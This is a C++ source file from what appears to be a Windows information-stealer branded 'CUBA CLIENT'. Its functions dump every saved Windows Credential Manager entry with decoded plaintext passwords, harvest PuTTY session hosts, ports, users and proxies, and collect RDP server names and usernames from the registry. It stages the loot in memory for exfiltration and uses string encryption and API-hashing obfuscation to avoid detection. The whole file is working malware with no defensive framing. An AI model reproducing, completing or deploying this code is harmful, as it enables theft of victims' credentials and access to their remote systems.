#include <misc_stealing/credentials.hpp>
#include <string>
#include <windows.h>
#include <wincred.h>
#include <exfiltration_utils/mem_store.hpp>
#include <crypto_utils/skCrypter.hpp>
#include <obfuscation/api_hash.hpp>
#include <obfuscation/iat_proxy.hpp>

namespace misc_exfiltration {

static std::string blob_to_str(LPBYTE data, DWORD size) {
    if (!data || size == 0) return "";
    //try UTF-16LE first
    if (size >= 2 && size % 2 == 0) {
        int chars = WideCharToMultiByte(CP_UTF8, 0,
            (LPCWSTR)data, (int)(size / sizeof(wchar_t)),
            nullptr, 0, nullptr, nullptr);
        if (chars > 0) {
            std::string r(chars, '\0');
            WideCharToMultiByte(CP_UTF8, 0,
                (LPCWSTR)data, (int)(size / sizeof(wchar_t)),
                r.data(), chars, nullptr, nullptr);
            bool ok = true;
            for (unsigned char c : r) { if (c < 0x09) { ok = false; break; } }
            if (ok) return r;
        }
    }
    return std::string(reinterpret_cast<char*>(data), size);
}

void steal_all_credentials() {
    PCREDENTIALA* creds = nullptr;
    DWORD count = 0;
    if (!iat::cred_enumerate_a(nullptr, 0, &count, &creds)) return;

    std::string out;
    for (DWORD i = 0; i < count; i++) {
        std::string target = creds[i]->TargetName   ? creds[i]->TargetName   : "";
        std::string user   = creds[i]->UserName      ? creds[i]->UserName      : "";
        std::string pass   = blob_to_str(creds[i]->CredentialBlob, creds[i]->CredentialBlobSize);
        DWORD type = creds[i]->Type;

        out += skCrypt("Target: ") + target + "\n"
             + skCrypt("User: ")   + user   + "\n"
             + skCrypt("Pass: ")   + pass   + "\n"
             + skCrypt("Type: ")   + std::to_string(type) + "\n"
             + skCrypt("\n-# CUBA CLIENT #-\n");
    }
    iat::cred_free(creds);
    if (!out.empty())
        mem_store::append(skCrypt("misc/credentials.txt"), out);
}

void steal_putty() {
    //HKCU\Software\SimonTatham\PuTTY\Sessions
    HKEY hSessions = nullptr;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      skCrypt("Software\\SimonTatham\\PuTTY\\Sessions"),
                      0, KEY_READ, &hSessions) != ERROR_SUCCESS)
        return;

    std::string out;
    char session_name[256];
    DWORD idx = 0;
    DWORD name_len = sizeof(session_name);

    while (RegEnumKeyExA(hSessions, idx++, session_name, &name_len,
                         nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
        HKEY hSess = nullptr;
        if (RegOpenKeyExA(hSessions, session_name, 0, KEY_READ, &hSess) == ERROR_SUCCESS) {
            auto read_val = [&](const char* vname) -> std::string {
                char buf[512] = {};
                DWORD sz = sizeof(buf), type = 0;
                if (RegQueryValueExA(hSess, vname, nullptr, &type, (LPBYTE)buf, &sz) == ERROR_SUCCESS)
                    return std::string(buf, strnlen(buf, sz));
                return "";
            };
            std::string host     = read_val(skCrypt("HostName"));
            std::string port     = read_val(skCrypt("PortNumber"));
            std::string user     = read_val(skCrypt("UserName"));
            std::string proxy    = read_val(skCrypt("ProxyHost"));

            out += skCrypt("Session: ")  + std::string(session_name) + "\n"
                 + skCrypt("Host: ")     + host   + "\n"
                 + skCrypt("Port: ")     + port   + "\n"
                 + skCrypt("User: ")     + user   + "\n"
                 + skCrypt("Proxy: ")    + proxy  + "\n"
                 + skCrypt("\n-# CUBA CLIENT #-\n");
            RegCloseKey(hSess);
        }
        name_len = sizeof(session_name);
    }
    RegCloseKey(hSessions);

    if (!out.empty())
        mem_store::append(skCrypt("misc/putty_sessions.txt"), out);
}

void steal_rdp_hosts() {
    //HKCU\Software\Microsoft\Terminal Server Client\Servers
    HKEY hServers = nullptr;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      skCrypt("Software\\Microsoft\\Terminal Server Client\\Servers"),
                      0, KEY_READ, &hServers) != ERROR_SUCCESS)
        return;

    std::string out;
    char server_name[256];
    DWORD idx = 0;
    DWORD name_len = sizeof(server_name);

    while (RegEnumKeyExA(hServers, idx++, server_name, &name_len,
                         nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
        HKEY hSrv = nullptr;
        if (RegOpenKeyExA(hServers, server_name, 0, KEY_READ, &hSrv) == ERROR_SUCCESS) {
            char username[256] = {};
            DWORD sz = sizeof(username);
            RegQueryValueExA(hSrv, skCrypt("UsernameHint"), nullptr, nullptr, (LPBYTE)username, &sz);
            RegCloseKey(hSrv);

            out += skCrypt("Server: ")   + std::string(server_name) + "\n"
                 + skCrypt("Username: ") + std::string(username)    + "\n"
                 + skCrypt("\n-# CUBA CLIENT #-\n");
        }
        name_len = sizeof(server_name);
    }
    RegCloseKey(hServers);

    if (!out.empty())
        mem_store::append(skCrypt("misc/rdp_hosts.txt"), out);
}

} //namespace misc_exfiltration
